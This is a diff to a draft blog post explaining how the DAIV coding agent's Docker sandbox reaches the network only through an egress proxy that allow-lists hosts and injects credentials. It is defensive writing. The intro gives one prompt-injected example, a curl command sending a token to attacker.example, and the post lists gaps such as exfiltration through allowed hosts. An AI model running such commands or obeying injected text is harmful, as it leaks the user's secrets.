@@ -1,13 +1,13 @@
 ---
 title: "Giving a coding agent network access without giving it your secrets"
 date: 2026-12-08
-summary: "A coding agent's sandbox reaches only the hosts you list, through a proxy that adds credentials on the way out, so the agent never holds them."
+summary: "A coding agent's sandbox reaches the internet only through a proxy that enforces a host list and adds credentials on the way out, so the agent never holds them."
 author: Sandro Rodrigues
 image: egress-policy.png
 draft: true
 ---
 
-An agent that fixes a failing CI job has to run `pip install` or `npm ci`, so its sandbox needs the network. If that sandbox also holds a registry token, one prompt-injected command such as `curl -d "$TOKEN" https://attacker.example` sends the token anywhere. Below is a setup that avoids it, with the code and its limits: the sandbox has no route out except a proxy of its own, the proxy lets through only the hosts you list, and it adds credentials to requests on their way out, so they never exist inside the container.
+An agent that fixes a failing CI job has to run `pip install` or `npm ci`, so its sandbox needs the network. If that sandbox also holds a registry token, one prompt-injected command such as `curl -d "$TOKEN" https://attacker.example` sends the token anywhere. Below is a setup that avoids it, with the code and its limits: the sandbox has no route to the internet except a proxy of its own, the proxy lets through only the hosts you list plus the git host the run pushes to, and it adds credentials to requests on their way out, so they never exist inside the container.
 
 It is how DAIV, an open-source coding agent for GitLab and GitHub that you host yourself, runs the agent's commands and its own `git push` in a Docker sandbox.
 
@@ -17,7 +17,7 @@ When that sandbox tries to reach a host you did not list, the request gets a 403
 egress: blocked CONNECT attacker.example — reason=host-not-listed (no rule matched; default=deny)
 ```
 
-The list itself is a form on each sandbox environment. This one allows the Python and container registries read-only, and adds an `Authorization` header for a private registry:
+The list itself is a form on each sandbox environment. This one denies unlisted hosts, allows the Python and container registries read-only, and adds an `Authorization` header for a private registry. The git host is not in the form, because DAIV adds it itself:
 
 ![The sandbox environment form in DAIV with Network on, unlisted hosts denied, and four allowed hosts: pypi.org, files.pythonhosted.org and ghcr.io read-only, and registry.acme.internal read-only with an Authorization credential.](egress-policy.png)
 
@@ -27,7 +27,7 @@ A coding agent reads text that other people wrote: issue descriptions, review co
 
 So the design goal is narrower than "isolate the agent". The agent should be able to use a credential without ever being able to read it, and reach the hosts its work needs and no others.
 
-![A diagram: the sandbox container connects over an internal network with no gateway to a per-session egress proxy. The proxy checks whether the host is listed, whether the method is allowed, and adds the host's credential, denying on any error. pypi.org is allowed read-only, registry.acme.internal is allowed with an Authorization header added, and attacker.example is not listed and gets a 403.](egress-flow.svg)
+![A diagram: the sandbox container connects over an internal network with no route out to a per-session egress proxy. The proxy checks whether the host is listed, whether the method is allowed, and adds the host's credential, denying on any error. pypi.org is allowed read-only, registry.acme.internal is allowed with an Authorization header added, and attacker.example is not listed and gets a 403.](egress-flow.svg)
 
 ## No route out except the proxy
 
@@ -47,13 +47,13 @@ def create_network(self, token: str) -> str:
 
 ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L83-L91))
 
-An `internal` Docker network has no gateway, so the sandbox has no route to the internet. Only the proxy has a second network interface that reaches the outside ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L127-L128)).
+An `internal` Docker network has no default route, and Docker drops its traffic to other networks, so the sandbox cannot reach the internet directly. It can still reach the Docker host at the network's gateway address. Only the proxy has a second network interface that reaches the outside ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L127-L128)).
 
-The sandbox gets `HTTP_PROXY`, `HTTPS_PROXY` and the CA bundle variables that pip, npm, git, curl and requests read ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L49-L66)). Those variables are a convenience for well-behaved tools. The enforcement is the network: a process that ignores them has nowhere to go.
+The sandbox gets `HTTP_PROXY`, `HTTPS_PROXY` and the CA bundle variables that pip, npm, git, curl and requests read ([manager.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/manager.py#L49-L66)). Those variables are a convenience for well-behaved tools. The enforcement is the network: a process that ignores them cannot reach the internet.
 
 There is no option to attach a sandbox to an open network. If the deployment has no CA configured for the proxy, a request for network access is refused rather than given a network without a policy ([main.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/main.py#L276-L283)).
 
-## Every request is checked twice
+## Every HTTPS connection is checked twice
 
 The proxy is [mitmproxy](https://mitmproxy.org/) 12.1.2 ([Dockerfile](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/egress_proxy/Dockerfile#L3)) with an addon of about 200 lines ([addon.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/addon.py)). It checks each connection at two points.
 
@@ -62,7 +62,9 @@ The proxy is [mitmproxy](https://mitmproxy.org/) 12.1.2 ([Dockerfile](https://gi
 
 The second check needs the proxy to see inside HTTPS, so the sandbox trusts the proxy's CA certificate. DAIV always intercepts the TLS of every reachable host, and an environment cannot turn that off ([docs](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/docs/features/sandbox-environments.md#L120)).
 
-A rule is a host glob such as `*.githubusercontent.com`, the methods it allows, and optionally a credential. (DAIV's own git rules can also limit a rule to a path prefix; the environment form does not offer that.) The form's **Read-only** choice allows `GET`, `HEAD` and `OPTIONS`. A host that matches a rule but uses a method the rule does not allow is denied, even when unlisted hosts are allowed. Without that, a per-host method limit would do nothing under an allow-by-default policy ([policy.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/policy.py#L186-L193)).
+A rule is a host glob such as `*.githubusercontent.com`, the methods it allows, and optionally a credential. (DAIV's own git rules can also limit a rule to a path prefix; the environment form does not offer that.) The form's **Read-only** choice allows `GET`, `HEAD` and `OPTIONS`.
+
+The proxy uses the first rule that matches the host and path and allows the method, so a **Read-only** rule does not block a method that another matching rule allows. When rules match the host but none allows the method, the request is denied, even when unlisted hosts are allowed. Without that, a per-host method limit would do nothing under an allow-by-default policy ([policy.py](https://github.com/srtab/daiv-sandbox/blob/v0.6.0/daiv_sandbox/egress/policy.py#L174-L195)).
 
 ## Credentials are added on the way out
 
@@ -131,9 +133,9 @@ Two less obvious cases:
 
 ## The git platform is one more rule
 
-DAIV pushes from inside the sandbox too. When a run holds a push token, DAIV adds a rule for the repository's git host in front of the environment's own rules, carrying that token ([egress.py](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/core/sandbox/egress.py#L1-L8)). It does this even when the environment has the network off, so the run can still publish its branch ([docs](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/docs/features/sandbox-environments.md#L101)).
+DAIV pushes from inside the sandbox too. When a run holds a push token, DAIV adds a rule for the repository's git host in front of the environment's own rules, carrying that token ([egress.py](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/core/sandbox/egress.py#L1-L8)). It does this even when the environment has the network off, so the run can still publish its branch ([docs](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/docs/features/sandbox-environments.md#L101)). That rule allows every method and comes first, so a **Read-only** entry for the git host in the form changes nothing.
 
-With several repositories in one session, each one's traffic carries its own token through a path-scoped rule. How the token is minted and scoped is the subject of [the companion post on keeping the GitLab token out of the sandbox](/blog/gitlab-token-out-of-agent-sandbox/).
+With several repositories in one session, the main repository's token goes on every request to the git host, and each other repository's token replaces it on requests under that repository's path. How the token is minted and scoped is the subject of [the companion post on keeping the GitLab token out of the sandbox](/blog/gitlab-token-out-of-agent-sandbox/).
 
 ## What it costs
 
@@ -143,12 +145,15 @@ With several repositories in one session, each one's traffic carries its own tok
 
 ## What this does not protect against
 
-- **Use, as opposed to theft.** The agent cannot read a credential, but anything running in the sandbox can send requests that the proxy will authenticate. For the git host, the code says it plainly: "anything running in the sandbox can send authenticated requests to that host" ([GitHub client](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/codebase/clients/github/client.py#L357-L368)). The limit is the credential's own scope. The git tokens reach one repository, but within it they can push: on GitLab to any branch that is not protected, and on GitHub to workflow files too when the GitHub App grants `workflows: write`. A registry credential you add is only as narrow as the token you create for it.
+- **Use, as opposed to theft.** The agent cannot read a credential, but anything running in the sandbox can send requests that the proxy will authenticate. For the git host, the code says it plainly: "anything running in the sandbox can send authenticated requests to that host" ([GitHub client](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/codebase/clients/github/client.py#L357-L368)). The limit is the credential's own scope. The git tokens can push to one repository: on GitLab to any branch a Developer may push to, and on GitHub to workflow files too when the GitHub App grants `workflows: write`. A registry credential you add is only as narrow as the token you create for it.
 - **Data leaving through an allowed host.** The proxy decides where requests may go, not what they contain. A read-only rule stops uploads by method, but a `GET` can still carry data in its URL. My reading is that the allow-list should hold only hosts you would accept that from.
+- **Environment variables.** Only the header credentials set under network access stay in the proxy. An environment's variables, including ones marked **Secret**, are set inside the sandbox, where any command can read them.
 - **An allow-by-default policy.** An environment can set unlisted hosts to **Allow**. The proxy still adds credentials and enforces method limits, but nothing stops traffic to other hosts.
-- **The GitLab fallback.** Whenever GitLab won't mint a project token, DAIV falls back to the configured personal access token, and that is what the proxy adds for the git host. That covers a DAIV user below Maintainer, a plan without project access tokens such as GitLab.com Free, and any failed mint, for 5 minutes after a transient error and an hour after any other ([GitLab client](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/codebase/clients/gitlab/client.py#L529-L558)). It still never enters the sandbox, but it can do far more than push to one project.
+- **The GitLab fallback.** Whenever GitLab won't mint a project token, DAIV falls back to the configured personal access token, and that is what the proxy adds for the git host. That covers a DAIV user below Maintainer, a plan without project access tokens such as GitLab.com Free, and any failed mint. DAIV asks GitLab again only after 5 minutes for a transient error and an hour for any other, and a running session's proxy keeps the personal access token until a mint succeeds and DAIV next updates the proxy, at the start of a turn or before a publish ([GitLab client](https://github.com/srtab/daiv/blob/baf6f6d2367adb9dd100a3686ecfe1a51cb0d6c5/daiv/codebase/clients/gitlab/client.py#L529-L558)). It still never enters the sandbox, but it can do far more than push to one project.
 - **The container boundary.** Sandboxes run under Docker's default `runc` runtime unless the operator selects gVisor (`runsc`). A container escape is outside what the proxy can help with.
 
 ## Trying it
 
-The proxy is part of [daiv-sandbox](https://github.com/srtab/daiv-sandbox), which DAIV's Docker Compose setup runs. The [sandbox environments page](https://docs.daivagent.com/latest/features/sandbox-environments/#network-access-and-egress-policy) of the docs covers the allow-list and credentials, and the [deployment reference](https://docs.daivagent.com/latest/reference/env-variables/#deployment-files) covers the CA files the proxy needs.
+The proxy is part of [daiv-sandbox](https://github.com/srtab/daiv-sandbox), which DAIV's Docker Compose setup runs. It needs a CA certificate and key on the sandbox service, which the [deployment reference](https://docs.daivagent.com/latest/reference/env-variables/#deployment-files) covers. Without them, a run whose environment has the network on stops instead of running with an open network.
+
+To see the 403 from the top of this post, go to **Settings** → **Sandbox environments** and create an environment with **Network** **On**, one allowed host such as `pypi.org` set to **Read-only**, and **Unlisted hosts** set to **Deny**. Select that environment in the run composer, and ask the agent to `curl` a host you did not list, other than your git host, such as `example.com`. The [sandbox environments page](https://docs.daivagent.com/latest/features/sandbox-environments/#network-access-and-egress-policy) covers the rest of the form, credentials included.
